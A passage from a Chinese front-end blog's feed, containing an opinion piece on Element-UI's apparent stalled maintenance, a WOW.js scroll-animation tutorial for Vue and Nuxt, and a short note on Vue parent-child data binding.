    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Element-Ul是国内饿了么前端团队推出的一款基于Vue.js 2.0 的桌面端UI框架，一套为开发者、设计师和产品经理准备的基于 Vue 2.0 的桌面端组件库，他们也推出了对应的手机端框架Mint UI （已经早早的停止维护了，如果感兴趣看看隔壁的Vant框架）</p><p>GitHub代码仓库地址：<a href="https://github.com/ElemeFE/element" target="_blank" rel="noopener">https://github.com/ElemeFE/element</a><br>官方框架学习帮助文档：<a href="http://element-cn.eleme.io/#/zh-CN" target="_blank" rel="noopener">http://element-cn.eleme.io/#/zh-CN</a></p><p> <img src="http://p3-tt.byteimg.com/large/pgc-image/8c3979ca0f4143c0ba3c7f4aa610a0bf?from=pc"></p><h2 id="Element-UI到底有多火？"><a href="#Element-UI到底有多火？" class="headerlink" title="Element-UI到底有多火？"></a>Element-UI到底有多火？</h2><p>可以说这是目<strong>前Vue生态圈最火的桌面UI组件库</strong>，没有之一。基本你使用Vue没有不知道这个组件库的。<br><img src="http://p1-tt.byteimg.com/large/pgc-image/622c5c2d0eb64c4a849d77b078faf4cc?from=pc"></p><p>别跟我说Ant Design和iView什么的？前者是相对于React生态圈的，而Vue版本的Ant Design Vue一直都是唐金州个人在主要维护，加上一些社区的中国开发者在维护。你真的不敢保证这个也会是个为了KPI而开源的项目，而且也有网友反应Ant Design Vue代码仓库中有Element代码抄袭的影子，作者反应是为了保证接口跟Element的一致性，这是欲盖弥彰，还是实锤抄袭？而对于后者iView则直接把Element代码拿过来复制黏贴，莫名投来一个鄙视的表情包~~~<br><img src="http://p6-tt.byteimg.com/large/pgc-image/7b50ecff6ed9476785148e114c179641?from=pc"></p><p>其实在Vue刚出来不久前，尤雨溪（Vuejs的创建者）也很大推荐了这套UI框架。Element的视觉设计更符合国人的观赏体验，不同于一直不温不火的国外Material Design(vue生态中代表框架是：<strong>Vuetify</strong>，<strong>Quasar</strong>), 这个是谷歌一直推了好多年的UI设计标准，现在几乎所有的谷歌产品都迁移到Material Desgin的风格，包括官网。<br><img src="http://p6-tt.byteimg.com/large/pgc-image/204549db770f455a8cb8c2619af80569?from=pc"><br>之前我也陆陆续续使用Vuetify和Quasar Framework制作一些个人网站的页面，领导或产品经理对于移动端的部分没什么意见，主要是Android界面已经被谷歌设计的基于Material Design风格的了，所以大家也还算能接受。但在桌面端网页上使用Material Design 的风格，在视觉习惯上国内基本都不太能接受，这怕是国内普遍的情况。其实要说质量、更新频率和文档完整程度，上述的两个国外UI库都要略优于国内的库，但在国内普及不开来，也是无奈！</p><p><img src="http://p1-tt.byteimg.com/large/pgc-image/3baf4f2bc99f402ea39615c5a6f1bc5a?from=pc"></p><p>而对于Element的界面设计标准，他的细节设计则更能打动国人。看看这个全世界范围内几大Vue框架的对比，你就知道Element的普及率和使用率了：</p><p><img src="http://p3-tt.byteimg.com/large/dfic-imagehandler/2fdde97b-1e66-449a-8780-bf54d5c1d1cc?from=pc"><br>element大约在去年年初开始下滑，在此之前的使用率一直碾压其他主流框架</p><p><img src="http://p1-tt.byteimg.com/large/dfic-imagehandler/83d7c469-32dc-47ef-ab06-43e8a2da01dd?from=pc"><br>再看看这star数，还是蛮多的，毕竟很大一部分也是国人在使用</p><p>其实判断一个框架的好坏主要看你配置的生态和开发团队实力。就像这两年嚷嚷着的华为的鸿蒙操作系统，没有对应的生态谈何去对抗安卓和苹果？而反观我们的Element在国内使用的普及率，覆盖率，<strong>认知度是相当高的</strong>，生态已经基本全覆盖。例如很多在Element上进行二次开发的框架，比如最有名的一些Element上层生态产品：</p><ul><li>Avuejs: <a href="https://avuejs.com/" target="_blank" rel="noopener">https://avuejs.com/</a></li><li>Vue Admin Beautiful: <a href="https://github.com/chuzhixin/vue-admin-beautiful" target="_blank" rel="noopener">https://github.com/chuzhixin/vue-admin-beautiful</a></li><li>PanJiaChen/vue-element-admin: <a href="https://github.com/PanJiaChen/vue-element-admin" target="_blank" rel="noopener">https://github.com/PanJiaChen/vue-element-admin</a></li><li>Vue Form Generator: <a href="https://github.com/JakHuang/form-generator" target="_blank" rel="noopener">https://github.com/JakHuang/form-generator</a></li><li>RuoYi: <a href="https://gitee.com/sushengbuyu/RuoYi" target="_blank" rel="noopener">https://gitee.com/sushengbuyu/RuoYi</a></li><li>JEECG开源社区/jeecg-boot: <a href="https://gitee.com/jeecg/jeecg-boot" target="_blank" rel="noopener">https://gitee.com/jeecg/jeecg-boot</a></li></ul><p>还有其他更多实际的运作中的项目,这里就不一一赘述了。</p><p>另外Element 也提供了对**Sketch **和 **Axure **等原型工具的支持。对设计人员，产品经理快速设计网页很友好，像国内的优秀原型设计工具墨刀，Mockplus等也都同步封装了大量Element的界面组件。这些都进一步的降低了Element的开发封装成本。构建了Element强大的生态。</p><p>可以说这是<strong>国内目前唯一一个真正推向国际的Vue生态UI框架</strong>。就像国内科技公司一直在做种种尝试突破国外市场，尝试打破各种国外垄断，但是真正打入国外市场的科技公司这些年却也只有抖音（国外版TikTok)。</p><p><img src="http://p1-tt.byteimg.com/large/pgc-image/d47ff61cb04e4cc7aea0fec1670b5348?from=pc"></p><p>如果以此类比Vue的生态圈，那么Element无疑就是那个最耀眼的TikTok。当然国内也有其他一些框架在前赴后继的维护和更新，可最后也只在国内大放异彩，国外使用度仍屈指可数！</p><h2 id="当前仓库状态"><a href="#当前仓库状态" class="headerlink" title="当前仓库状态"></a>当前仓库状态</h2><p>是的，Element确实有很多先发的优势，随着它的发展历程，也在逐步扩大相关的生态，版本更新迭代也是很频繁。可是大约从2019年9月份左右Element 的代码提交开始放缓，基本停滞了，最近的一次提交是在2020年5月份的更新，也就是更新了下版本号和微小改动。</p><p><img src="http://p6-tt.byteimg.com/large/pgc-image/983571198e834fbcb4389bf2b2a853b0?from=pc"><br>这可真是快一年代码基本没有更新了</p><p>代码仓库提交量最多的两个大佬也已经按兵不动了。。。</p><p><img src="http://p1-tt.byteimg.com/large/pgc-image/b9973f694bbe4243a1cf071a3266a1ab?from=pc"><br>据说两个大佬Leopoldthecoder和QingWei-Li已经跳槽到了石墨</p><p><img src="http://p3-tt.byteimg.com/large/pgc-image/ef636acaa3f6444492bcc0cb6fe1b4d4?from=pc"><br>突然发现仓库以前的几个维护人员已经没有了</p><h2 id="收购-离职风起云涌"><a href="#收购-离职风起云涌" class="headerlink" title="收购+离职风起云涌"></a>收购+离职风起云涌</h2><p>大家都知道阿里已经收购了饿了么，难道真的是 阿里收购饿了么，要干掉Element扶植自己的亲儿子Ant Design吗？<strong>饿了么被阿里收购后原团队已经被肢解？？？</strong></p><p>要知道我也是一名忠实且重度使用Element的用户，看到最近一年Element的更新状态很是忧伤和焦虑哎！</p><p><img src="http://p3-tt.byteimg.com/large/pgc-image/9eec02461edc46a28b4a4db419bd8415?from=pc"><br>网友也开始急了，这么大的项目</p><p><img src="http://p3-tt.byteimg.com/large/dfic-imagehandler/c394e2a3-5994-4613-a5ac-7016b86385ce?from=pc"><br>一颗受伤的小心脏啊</p><p>带着满脸的惊叹号，我开始搜寻Element目前到底什么情况了？为什么好好的框架不维护了呢？</p><p><img src="http://p3-tt.byteimg.com/large/pgc-image/b17ab84b0d5045debe608435136587ef?from=pc"><br>一开始有人反映这是个KPI项目，起初饿了么内部团队做的时候确实没有想到发展这么好。但是后来的发展势头确实已经超出了他们的预期。。。现在加上收购后并入阿里，自然一山不容二虎。。。</p><p><img src="http://p3-tt.byteimg.com/large/pgc-image/13f59bd66b63444c998f0399da88b1cb?from=pc"><br>大部分ant-design-vue代码是直接从element改过去的</p><p>但后来有相关知情人透露并没有所谓的并入，而且据说Ant Desgin其核心开发人员也就才五六个人，也不是全职在做。所以并不存在谁轻谁重问题。<strong>但是饿了么公司是否重新维护这个项目，那真的是决策的问题。</strong></p><p><img src="http://p6-tt.byteimg.com/large/pgc-image/1e1dbc2853df4a0bb9efb45b72c5a50f?from=pc"><br>现在饿了么前端核心维护人员变动几乎是肯定的，据听说几个大佬纷纷跳槽离开饿了么，有的到了字节跳动，有的到了石墨。。。但从commit历史来看也不是第一次这样了，至于后续动态真的不敢妄加猜测</p><p>这里还有一群Element的忠实粉丝在角落里瑟瑟发抖。。。</p><p><img src="http://p3-tt.byteimg.com/large/pgc-image/6e794b8b8fb54e92b03fbeb0d0183e0c?from=pc"><br>相对于隔壁Reat生态最强框架，element瑟瑟发抖</p><p><img src="http://p6-tt.byteimg.com/large/pgc-image/6382f9bc7409455b9735c698f9a64b44?from=pc"><br>vue-element-admin作者表示很受伤</p><p>所以有人提议捐钱帮助Element发展，毕竟是个开源项目，没点钱怎么坚持下去？安排。。。</p><p><img src="http://p1-tt.byteimg.com/large/pgc-image/d6978f60ca0340b2b70cc8fd86bf7ca6?from=pc"><br>网友群献策支持element</p><p>可惜Element现在状态真的让你爱莫能助，连捐款的通道它都关闭了！</p><p><img src="http://p1-tt.byteimg.com/large/pgc-image/a32eab3a93544de294975eb47c6d9c42?from=pc"><br>可惜的是element已经关闭了所有的捐钱通道，爱莫能助</p><p><img src="http://p6-tt.byteimg.com/large/pgc-image/d6d5684533684e2b82e47f2fc5a91f09?from=pc"></p><p>峰回路转，就在我快要绝望的时候，又有一位前Element的维护大佬说到<strong>Element将来不会停止维护</strong>。</p><blockquote><p>“还在维护，踩一下说“KPI 项目，积重难返”的童鞋，即使它是KPI项目，也远远远远超出了当时定立KPI的期望，何况不是 ”</p></blockquote><p><img src="http://p6-tt.byteimg.com/large/pgc-image/c1739631afc041189012858dd629f063?from=pc"><br>大佬出来声明element接下来状态</p><p><img src="http://p6-tt.byteimg.com/large/pgc-image/07388536c236439bac45c47353a52b77?from=pc"><br>即使是KPI项目，我们也爱你</p><p>Element团队真的要上点心了，如果今年继续这样半死不活，只会失去更多的用户，让大家更寒心。<strong>难道国内的开源都是真的面向KPI开源吗？</strong></p><p>趁着Element半死不活的, 对面的<strong>iView</strong>和<strong>Vuetify</strong>也已经开始蠢蠢欲动，一波波广告好不热闹。。。</p><p><img src="http://p1-tt.byteimg.com/large/pgc-image/6c0cfa9a87594dcfbe5e929e60961fa4?from=pc"><br>iview也来打个广告吗</p><p><img src="http://p6-tt.byteimg.com/large/pgc-image/741de109734141e78bc2e084bcec2c37?from=pc"><br>对面的vuetify也来凑热闹，无情嘲讽</p><p><img src="http://p1-tt.byteimg.com/large/pgc-image/134ef10bbc764728b91aa0e87c5387e3?from=pc"></p><h2 id="何不换个框架？"><a href="#何不换个框架？" class="headerlink" title="何不换个框架？"></a>何不换个框架？</h2><p>说到这里，你可能会反问为什么不换个框架呢，市场面毕竟还有那么多框架可以选择？干嘛一棵树上吊死！</p><p>其实我也想换个框架，无奈可选的空间太小，就个人使用体验来说，Element还是感觉最上手，是我最喜欢的UI框架。这可不是我一个人有这样的感觉。。。。看看下面网友对Element的一众打CALL</p><p>这里主要针对的是Ant Design，毕竟在国内市场这两个是平级关系，仅作参考！</p><blockquote><p>Ant Design Vue没有 element 舒服，element ui算是彻底贯彻了vue的思想，优先用template，但是antd vue，iview之类的，很多地方都在用render函数，本质上就是想用jsx。本身vue易用就易用在这个template上，element ui确实提炼出一套基于template做到直观、易用的方法，因此吸引了很大一批人。但是讲到可定制化，就远不如jsx了。个人还是比较喜欢template和代码分离，看起来清晰一点。</p></blockquote><blockquote><p>antd-vue总觉得还是react那味。搞得太复杂，导致使用上收起来不是很快，而且问题也不少。而element即使不维护也基本没有严重的bug存在。</p></blockquote><p><img src="http://p6-tt.byteimg.com/large/pgc-image/2ab2772da8824397b95d04d7b92a67bc?from=pc"><br>Element接口封装的确实很干净</p><p><img src="http://p6-tt.byteimg.com/large/pgc-image/bc84f7408dd14ebe85ab0a1890616e69?from=pc"><br>打动网友的Element框架</p><p>其实上面也提到了，Ant Design Vue的接口设计也在慢慢靠拢Element，借鉴它的设计，一来方便使用者可以快速上手Ant Design,另外也省的再造轮子。</p><p>互联网的技术总是在更新换代，我们无法保证自己熟悉的一个框架技术可以永葆青春，谁都有谢幕的那一天！如果真到了Element要谢幕的那一天，我们也只能无奈欢送！</p><h2 id="接下来我们怎么办？"><a href="#接下来我们怎么办？" class="headerlink" title="接下来我们怎么办？"></a>接下来我们怎么办？</h2><p>说了这么多Element的前途叵测，Element项目未来也不明朗，那我们这些伸手党能做些什么呢？我这里可以给大家一些建议。</p><ul><li><p><strong>Element至于凉不凉主要看Vue3出来后它的动作</strong>，目前的Element代码库支持Vue2.0绰绰有余，平时的开发工作完全可以应付，代码致命性的错误基本为零。毕竟经历了多年的洗礼和打磨，已经很成熟了。况且虽然现在的Element停止了新功能的开发工作，但是修复补丁工作还在继续，每天仍然还有大量的开发者参与进来修复网友反馈的问题。但是修复的问题现在不会merge和发布到新版。WTF 你只能静待Element的回归了。。。<br><img src="http://p3-tt.byteimg.com/large/pgc-image/1bea567925fd468792f443b2fb6c3215?from=pc"><br>虽然代码停止更新，但是版本的修复工作还是有在正常进行</p></li><li><p>如果我们还是离不开Element,还是对它情怀满满，你不妨自己尝试着将代码fork一份，自己在代码基础上造轮子，修修补补，岂不乐哉！<br><img src="http://p1-tt.byteimg.com/large/pgc-image/3bb59f6840ef4d5a8a5e5d3eb4d754be?from=pc"></p></li><li><p>其实上面也提到了Element生态很火，所以即使出现最糟的情况，我们还有一堆的第三方依赖库和网友定制版可以替代，目前社区出现了好些个人修改版的Element，也有的在做vue3.0 的兼容，但个人感觉不是很乐观，持续维护一个组件库的成本是非常高的，人力和精力的投入都没法计量。不管怎样，这也侧面说明你的选型是对的，选择Element是正确的。Element的生态如此强大，你也只需要做些前人栽树后人乘凉的事。<br><img src="http://p3-tt.byteimg.com/large/pgc-image/3c4f8ec4ce42419b9eb8bd2f4f468b10?from=pc"><br>最后真心希望接下来的日子里，我们的Element可以度过难关，继续蓬勃发展！</p></li></ul><p><img src="http://p1-tt.byteimg.com/large/pgc-image/b21bc3f63a3d41ea989a049602abc8e0?from=pc"><br>爱你喔，Element</p><p><img src="http://p3-tt.byteimg.com/large/pgc-image/bad89231d22846a2ba7d3f8d2ffe927f?from=pc"><br>再爱！</p><p><img src="http://p6-tt.byteimg.com/large/pgc-image/1bb0cbe335214ea4b16fb098d47eb70f?from=pc"><br>三连击爱！</p><h3 id="附录几个现在活跃维护定制版的Element-UI参考"><a href="#附录几个现在活跃维护定制版的Element-UI参考" class="headerlink" title="附录几个现在活跃维护定制版的Element-UI参考"></a>附录几个现在活跃维护定制版的Element-UI参考</h3><ul><li><p>网友版（这是针对vue3的版本）： <a href="https://github.com/a631807682/ele-next" target="_blank" rel="noopener">https://github.com/a631807682/ele-next</a></p></li><li><p>算是官方版（据说这是饿了么内部发行版会支持vue3）： </p><ul><li><a href="https://github.com/EOITek/element/commits/dev" target="_blank" rel="noopener"> https://github.com/EOITek/element/commits/dev</a></li><li><a href="https://www.npmjs.com/package/element-ui-eoi?activeTab=versions" target="_blank" rel="noopener">https://www.npmjs.com/package/element-ui-eoi?activeTab=versions</a></li></ul></li><li><p>网友版think-vuele(主要做了增强和修复）： <a href="https://github.com/chfree/think-vuele" target="_blank" rel="noopener">https://github.com/chfree/think-vuele</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Element-Ul是国内饿了么前端团队推出的一款基于Vue.js 2.0 的桌面端UI框架，一套为开发者、设计师和产品经理准备的基于 Vu</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>WOW.js在页面滚动时展现动感的元素动画效果</title>
    <link href="https://seniortesting.club/posts/iEccZVJ1oJ/"/>
    <id>https://seniortesting.club/posts/iEccZVJ1oJ/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<p><del>&gt; （已经不再维护，推荐使用aos） 插件描述：WOW.js 是一款帮助你实现滚动页面时触发CSS 动画效果的插件</del></p><p>在一些网页上，当你滚动页面的时候会看到各式各样的元素动画效果，非常动感。WOW.js 就是一款帮助你实现这种 CSS 动画效果的插件，很容易定制，你可以改变动画设置喜欢的风格、延迟、长度、偏移和迭代等。</p><p>Github仓库: <a href="https://github.com/matthieua/WOW" target="_blank" rel="noopener">https://github.com/matthieua/WOW</a></p><h2 id="Vue中使用方法"><a href="#Vue中使用方法" class="headerlink" title="Vue中使用方法"></a>Vue中使用方法</h2><p>由于其依赖于animate.css，所以可以不用再安装<a href="https://github.com/daneden/animate.css" target="_blank" rel="noopener">animate.css</a></p><ul><li>NPM</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install wowjs</span><br></pre></td></tr></table></figure><ul><li>YARN</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add wowjs</span><br></pre></td></tr></table></figure><ol><li>引入文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;animate.min.css&quot;&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>然后直接在html中使用如下代码：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;wow slideInLeft&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;wow slideInRight&quot;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>可以加入 data-wow-duration（动画持续时间）和 data-wow-delay（动画延迟时间）属性，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;wow slideInLeft&quot; data-wow-duration&#x3D;&quot;2s&quot; data-wow-delay&#x3D;&quot;5s&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;wow slideInRight&quot; data-wow-offset&#x3D;&quot;10&quot;  data-wow-iteration&#x3D;&quot;10&quot;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>JavaScript</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;WOW&#125; <span class="keyword">from</span> <span class="string">&#x27;wowjs&#x27;</span>;</span><br><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123; </span><br><span class="line">    <span class="keyword">new</span> WOW().init()</span><br><span class="line">&#125;,</span><br><span class="line">watch: &#123;</span><br><span class="line">   <span class="function"><span class="title">cases</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>.$nextTick(<span class="function">() =&gt;</span> &#123; <span class="comment">// 在dom渲染完后,再执行动画</span></span><br><span class="line">           <span class="keyword">const</span> wow = <span class="keyword">new</span> WOW(&#123;</span><br><span class="line">               boxClass: <span class="string">&#x27;wow&#x27;</span>,</span><br><span class="line">               animateClass: <span class="string">&#x27;animated&#x27;</span>,</span><br><span class="line">               offset: <span class="number">0</span>,</span><br><span class="line">               mobile: <span class="literal">true</span>,</span><br><span class="line">               live: <span class="literal">false</span></span><br><span class="line">           &#125;)</span><br><span class="line">           wow.init()</span><br><span class="line">       &#125;)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>配置</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wow = <span class="keyword">new</span> WOW(</span><br><span class="line">  &#123;</span><br><span class="line">    boxClass:     <span class="string">&#x27;wow&#x27;</span>,      <span class="comment">// animated element css class (default is wow)</span></span><br><span class="line">    animateClass: <span class="string">&#x27;animated&#x27;</span>, <span class="comment">// animation css class (default is animated)</span></span><br><span class="line">    offset:       <span class="number">0</span>,          <span class="comment">// distance to the element when triggering the animation (default is 0)</span></span><br><span class="line">    mobile:       <span class="literal">true</span>,       <span class="comment">// trigger animations on mobile devices (default is true)</span></span><br><span class="line">    live:         <span class="literal">false</span>,       <span class="comment">// act on asynchronously loaded content (default is true)</span></span><br><span class="line">    callback:     <span class="function"><span class="keyword">function</span>(<span class="params">box</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// the callback is fired every time an animation is started</span></span><br><span class="line">      <span class="comment">// the argument that is passed in is the DOM node being animated</span></span><br><span class="line">    &#125;,</span><br><span class="line">    scrollContainer: <span class="literal">null</span> <span class="comment">// optional scroll container selector, otherwise use window</span></span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line">wow.init();</span><br></pre></td></tr></table></figure><h2 id="nuxt中使用方法"><a href="#nuxt中使用方法" class="headerlink" title="nuxt中使用方法"></a>nuxt中使用方法</h2><p>Vue和Nuxt中最大的差别是在Nuxt中不可以直接使用window和document对象，因为在Nuxt中代码要经过两遍打包，一遍是在客户端，client端是有window和document对象的，一遍是在server端，但是server端中是没有window和document对象的，打包就会报错。而Vue中不是，Vue只在client端打包一次，所以有window，不会报错。</p><p>参考配置: <a href="https://zhuanlan.zhihu.com/p/67312908" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/67312908</a></p><p>在Nuxt中判断当前环境是不是clinet环境有一个变量 <code>process.browser</code> ,返回值为true 表示当前是<code>client</code>环境，false表示不是。</p><ol><li>js中使用</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;script&gt;</span></span><br><span class="line">       <span class="keyword">if</span> (process.browser) &#123; <span class="comment">// 在这里根据环境引入wow.js</span></span><br><span class="line">           <span class="keyword">const</span> &#123;WOW&#125; = <span class="built_in">require</span>(<span class="string">&#x27;wowjs&#x27;</span>)</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">           name: <span class="string">&quot;index&quot;</span>,</span><br><span class="line">           <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (process.browser) &#123;  <span class="comment">// 在页面mounted生命周期里面 根据环境实例化WOW</span></span><br><span class="line">                   <span class="keyword">new</span> WOW(&#123;</span><br><span class="line">                       live: <span class="literal">false</span>, </span><br><span class="line">                       offset: <span class="number">0</span></span><br><span class="line">                   &#125;).init()</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   <span class="comment">// &lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>其他参考： <a href="https://github.com/nuxt/nuxt.js/issues/1064" target="_blank" rel="noopener">How to use WOW.js with nuxt(https://github.com/nuxt/nuxt.js/issues/1064)</a></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>温馨提示：live为true时，浏览器调试器会弹出警告： [参考：WOW.js cannot detect dom mutations, please call .sync() after loading new content. · Issue #166 · matthieua/WOW](参考：WOW.js cannot detect dom mutations, please call .sync() after loading new content. · Issue #166 · matthieua/WOW)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;del&gt;&amp;gt; （已经不再维护，推荐使用aos） 插件描述：WOW.js 是一款帮助你实现滚动页面时触发CSS 动画效果的插件&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;在一些网页上，当你滚动页面的时候会看到各式各样的元素动画效果，非常动感。WOW.js 就是一款帮助你实现这种 CSS</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="javascript" scheme="https://seniortesting.club/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Vue 父子组件双向绑定</title>
    <link href="https://seniortesting.club/posts/HOpq0hwce0/"/>
    <id>https://seniortesting.club/posts/HOpq0hwce0/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="父组件向子组件传值"><a href="#父组件向子组件传值" class="headerlink" title="父组件向子组件传值"></a>父组件向子组件传值</h2><p>通过<code>props</code>属性传值，子组件<code>data</code>中定义一个新的副本，用来保存父组件传递过来的值。然后在<code>watch</code>中监听对应的props和data的属性值变化。</p><h2 id="子组件向父组件传值"><a href="#子组件向父组件传值" class="headerlink" title="子组件向父组件传值"></a>子组件向父组件传值</h2><p>通过<code>$emit</code>方法传值，可以用三种方式</p><ul><li>直接$emit一个事件，然后父组件可以通过@事件获取对应的值</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子组件</span></span><br><span class="line"> <span class="built_in">this</span>.$emit(<span class="string">&#x27;click&#x27;</span>, newValue)</span><br></pre></td></tr></table></figure><ul><li>直接<code>$emit</code>方法传递input方法，其实父组件此时通过@input获取了对应的值</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子组件</span></span><br><span class="line"> <span class="built_in">this</span>.$emit(<span class="string">&#x27;input&#x27;</span>,newValue)</span><br></pre></td></tr></table></figure><p>-直接<code>$emit</code>方法加上对应的<code>update:事件</code>,然后父组件可以用两种方式获取子组件的值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子组件</span></span><br><span class="line"><span class="built_in">this</span>.$emit(<span class="string">&#x27;update:show&#x27;</span>,newValue)</span><br><span class="line"><span class="comment">// 父组件</span></span><br><span class="line"><span class="string">`show.sync`</span>  或者 <span class="string">`:show @update:show`</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;父组件向子组件传值&quot;&gt;&lt;a href=&quot;#父组件向子组件传值&quot; class=&quot;headerlink&quot; title=&quot;父组件向子组件传值&quot;&gt;&lt;/a&gt;父组件向子组件传值&lt;/h2&gt;&lt;p&gt;通过&lt;code&gt;props&lt;/code&gt;属性传值，子组件&lt;code&gt;data&lt;/co</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
